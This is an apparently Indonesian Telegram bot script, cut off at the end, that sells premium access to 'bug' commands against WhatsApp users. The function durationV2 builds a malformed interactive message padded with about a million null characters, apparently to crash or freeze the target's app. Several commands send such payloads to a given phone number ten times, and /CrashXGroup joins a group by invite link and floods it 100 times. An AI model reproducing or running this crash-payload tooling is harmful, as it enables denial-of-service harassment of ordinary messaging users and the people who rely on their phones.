    
    console.log(`✅ wa target forklos bang 🤓 ${target}`);
}

async function durationV2(sock, target) {
    const duration = 10+10+20+30+40+50+60+70+80+90+100+110+120+130+140+150+160+170+180+190+200+210+220+230+240+250+260+270+280+290+300+310+320+330+340+350+360+370+380+390+400+410+420+430+440+450+460+470+480+490+500+510+520+530+540+550+560+570+580+590+600+610+620+630+640+650+660+670+680+690+700+710+720+730+740+750+760+770+780+790+800+810+820+830+840+850+860+870+880+890+900+910+920+930+940+950+960+970+980+990+1000+2000+3000+4000+6000+7000+8000+9000+5000+5000+4000 + "\u0000" + "\u200b" + "\u300b" + "\u600b" + "\u800b" + "\u200b" + "\u0025" + "\u700b";
    const blank = "\u0000".repeat(50000) + "\u300b".repeat(20000);
    const button = "quick_reply" + "single_singlet" + "booking_status" + "cta_url" + "cta_call";

    const Gren = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "GrenXHarimau duration V2",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "cta_url",
                        paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
                        url: "https://mmg.whatsapp.net",
                        merchantUrl: "t.me/GrenTzy",
                        version: 3
                    },
                    disappearingMode: {
                        initiator: "CHANGED_IN_CHAT",
                        trigger: "CHAT_SETTING"
                    },
                    contextInfo: {
                        stickerMessage: {
                            paymentInviteMessage: {
                                serviceType: 4,
                                expiryTimestamp: Date.now() + 9007199254740991,
                                blank: true,
                                button: true,
                                duration: true
                            }
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Gren, {});
    console.log("tes tuh kek nya ini work deh kan GrenXHarimau yang buat btw kalau work jangan lupa send record ke GrenTzy🫣");
    console.log("GrenXHarimau terkirim ke " + target);
}

// Case bot pemanggilan 
bot.onText(/\/delayv3(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /delayv3 62xxxx");
  }

  // Cek premium
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: "⏳ Memeriksa akses premium..."
    }).catch(() => null);
    return bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    // ✅ Gunakan multi sender: ambil sender aktif
    const activeSock = getActiveSender();
    if (!activeSock) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp aktif. Gunakan /addsender untuk menambah.");
    }
    if (!activeSock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Sender WhatsApp tidak valid. Coba /listsender dan pilih ulang.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "delayv3");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ delayv3 (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING delayv3 (BUG) 👻 ${i + 1} TO ${q}`);
        try {
          await durationV2(activeSock, target);
        } catch (err) {
          console.error(`Gagal kirim percobaan ${i+1} untuk ${q}:`, err.message);
        }
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /delayv3:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/delayv2(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /delayv2 62xxxx");
  }

  // Cek premium
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    // Baris berikut diperbaiki: membuat sendPhoto dengan caption sementara (tidak digunakan) dan disimpan ke variable
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: "⏳ Memeriksa akses premium..."
    }).catch(() => null); // agar tidak crash jika gagal
    // Kirim penolakan premium yang sebenarnya
    return bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    if (!sock || !sock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Koneksi WhatsApp tidak valid. Silakan hubungkan ulang.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "delayv2");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ delayv2 (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING delayv2 (BUG) 👻 ${i + 1} TO ${q}`);
        try {
          await GrenDelayHarimau(sock, target);
        } catch (err) {
          console.error(`Gagal kirim percobaan ${i+1} untuk ${q}:`, err.message);
        }
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /delayv2:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/delayv1(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /delayv1 62xxxx");
  }

  // Cek premium
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg";
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    // ✅ Validasi sock sebelum digunakan
    if (!sock || !sock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Koneksi WhatsApp tidak valid. Silakan hubungkan ulang.");
    }

    // Cooldown
    const cooldownRemaining = await checkCooldown(fromId, "delayv1");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Animasi warna tombol
    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    // Kirim pesan konfirmasi
    await bot.sendMessage(chatId, `✅ delayv1 (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    // Proses spam di background dengan error handling internal
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING delayv1 (BUG) 👻 ${i + 1} TO ${q}`);
        try {
          await GrenDelayXharimauV1(sock, target);
          await GrenDelayHarimau(sock, target);
          await GrenXHarimauCombo(sock, target);
        } catch (err) {
          console.error(`Gagal kirim percobaan ${i+1} untuk ${q}:`, err.message);
          // Tidak throw, lanjut ke iterasi berikutnya
        }
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /delayv1:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /forceclose 62xxxx");
  }

  // Cek premium (perbaiki variabel senderId -> fromId)
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg"; // gambar default
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    // Cooldown
    const cooldownRemaining = await checkCooldown(fromId, "forceclose");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Animasi warna tombol
    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    // Kirim pesan konfirmasi
    await bot.sendMessage(chatId, `✅ forceclose (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    // Proses spam di background
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING forceclose (BUG) 👻 ${i + 1} TO ${q}`);
        await GrenTzy(sock, target);
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /forceclose:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

// ==================== HARIMAU COMBO ====================
bot.onText(/\/harimaucombo(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /harimaucombo 62xxxx");
  }

  // Cek premium (perbaiki variabel senderId -> fromId)
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg"; // gambar default
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    // Cooldown
    const cooldownRemaining = await checkCooldown(fromId, "harimaucombo");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Animasi warna tombol
    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    // Kirim pesan konfirmasi
    await bot.sendMessage(chatId, `✅ harimaucombo (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    // Proses spam di background
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING harimaucombo (BUG) 👻 ${i + 1} TO ${q}`);
        await GrenXHarimauCombo(sock, target);
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /harimaucombo:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

// ==================== FCNOCLICKFREEZE ====================
bot.onText(/\/fcnoclickfreeze(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /fcnoclickfreeze 62xxxx");
  }

  // Cek premium (perbaiki variabel senderId -> fromId)
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg"; // gambar default
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    // Cooldown
    const cooldownRemaining = await checkCooldown(fromId, "fcnoclickfreeze");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Animasi warna tombol
    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    // Kirim pesan konfirmasi
    await bot.sendMessage(chatId, `✅ fcnoclickfreeze (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    // Proses spam di background
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING fcnoclickfreeze (BUG) 👻 ${i + 1} TO ${q}`);
        await fcNoClickFreeze(sock, target);
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /fcnoclickfreeze:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

// ==================== BLANKCLICKGREN ====================
bot.onText(/\/blankclickgren(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /blankclickgren 62xxxx");
  }

  // Cek premium (perbaiki variabel senderId -> fromId)
  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg"; // gambar default
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    // Cooldown
    const cooldownRemaining = await checkCooldown(fromId, "blankclickgren");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Animasi warna tombol
    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    // Kirim pesan konfirmasi
    await bot.sendMessage(chatId, `✅ blankclickgren (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    // Proses spam di background
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING blankclickgren (BUG) 👻 ${i + 1} TO ${q}`);
        await BlankClickGren(sock, target);
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /blankclickgren:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/CrashXGroup (https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const inviteLink = match[1];
  const inviteCode = inviteLink.split('/').pop();
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses, silahkan beli akses atau script ke owner.\nContact owner di bawah.`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "👑 OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx");
    }
    
    const sock = sessions.values().next().value;
    if (!sock) throw new Error("Tidak ada koneksi WhatsApp aktif");

    // Cek info grup atau join
    let groupInviteInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
    let groupJid;
    if (groupInviteInfo && groupInviteInfo.id) {
      groupJid = groupInviteInfo.id;
    } else {
      const joinResult = await sock.groupAcceptInvite(inviteCode).catch(() => null);
      if (!joinResult) throw new Error("Gagal bergabung ke grup. Periksa link atau bot sudah menjadi anggota?");
      groupJid = joinResult;
    }

    const total = 100; // Jumlah serangan (bisa disesuaikan)
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: `✨ *GREN X CRASH GROUP* ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *Target Group* : ${inviteLink}
⚙️ *Type* : CrashXGroup
📡 *Status* : 🔥 MEMPROSES 🔥
📊 *Progress* : ▱▱▱▱▱▱▱▱▱▱ 0%
🚀 *Kiriman* : 0/${total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "🔍 LIHAT GRUP", url: inviteLink }]]
      }
    });

    console.log("[PROSES MENGIRIM CrashXGroup]");

    for (let i = 1; i <= total; i++) {
      await CrashGren(sock, groupJid);
      
      // Delay acak 5-10 detik untuk keamanan
      const randomDelay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
      await sleep(randomDelay);

      // Update progress setiap 10 kiriman atau di akhir
      if (i % 10 === 0 || i === total) {
        const percent = Math.floor((i / total) * 100);
        const filled = Math.floor(percent / 10);
        const progressBar = "█".repeat(filled) + "▱".repeat(10 - filled);
        const statusIcon = percent < 70 ? "⚡ MENGIRIM" : "💀 TEROR TOTAL";
        const newCaption = `✨ *GREN X CRASH GROUP* ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *Target Group* : ${inviteLink}
⚙️ *Type* : CrashXGroup
📡 *Status* : ${statusIcon}
📊 *Progress* : ${progressBar} ${percent}%
🚀 *Kiriman* : ${i}/${total}
⏱️ *Delay* : ~${Math.floor(randomDelay/1000)} detik
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        await bot.editMessageCaption(newCaption, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "🔍 LIHAT GRUP", url: inviteLink }]]
          }
        }).catch(err => console.error("Edit error:", err.message));
      }
    }

    console.log("[SUCCESS] CrashXGroup selesai!");
    await bot.editMessageCaption(`✨ *GREN X CRASH GROUP* ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *Target Group* : ${inviteLink}
⚙️ *Type* : CrashXGroup
📡 *Status* : ✅ SUKSES 🔥
📊 *Progress* : ██████████ 100%
🚀 *Kiriman* : ${total}/${total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 Total serangan berhasil dikirim!`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "🔍 LIHAT GRUP", url: inviteLink }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal: ${error.message}`);
  }
});



bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "HTML" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu ngapain sih kontol lu bukan admin bego😤.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Command yang lu pake salah dongo noh contoh nya🤑. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Coba masukin lagi jangan jangan otak lu ngentot mulu makanya salah mulu😂.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/setjeda\s+(\d+[smh]|0s|0m|0h)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    // Hanya owner/admin yang boleh
    const isOwnerUser = (userId === OWNER_ID) || adminUsers.includes(userId);
    if (!isOwnerUser) {
        return bot.sendMessage(chatId, "❌ Hanya owner/admin yang bisa mengatur cooldown.");
    }
    const timeString = match[1];
    const response = setCooldown(timeString);
    bot.sendMessage(chatId, response);
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

// --------------- ( Case Or Bot on text Area ) --------------- \\
bot.onText(/^\/verip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputToken = match[1]?.trim();

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @GrenTzy");
  }
  
  if (!inputToken) {
    return bot.sendMessage(
      chatId,
      "🔑 Format salah!\n Format : /verip <token>"
    );
  }

  try {
    const res = await axios.get(GITHUB_TOKEN_LIST_URL);
    const validTokens = res.data.tokens || [];

    if (validTokens.includes(inputToken)) {

      if (!verifiedData.tokenVerified.includes(chatId)) {
        verifiedData.tokenVerified.push(chatId);
        saveVerifiedData(verifiedData);
      }

      return bot.sendMessage(
        chatId,
        "🔓 Token berhasil diaktifkan!\nGunakan /pw <pasword> untuk lanjut"
      );

    } else {
      return bot.sendMessage(chatId, "❌ Token tidak valid!");
      setTimeout(() => process.exit(0), 1200);
    }

  } catch (err) {
    return bot.sendMessage(chatId, "⚠️ Tidak bisa mengecek token.");
    
  }
});


bot.onText(/\/pw (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @GrenTzy");
  }
  
  if (!verifiedData.tokenVerified.includes(chatId)) {
    return bot.sendMessage(
      chatId,
      "🔐 Kamu belum verifikasi token!\nFormat : /verip <token>"
    );
  }

  if (!GLOBAL_PASSWORD) {
    return bot.sendMessage(chatId, "⚠️ Password belum dimuat.");
  }

  if (input === GLOBAL_PASSWORD) {

    if (!verifiedData.fullyVerified.includes(chatId)) {
      verifiedData.fullyVerified.push(chatId);
      saveVerifiedData(verifiedData);
    }

    return bot.sendMessage(
      chatId,
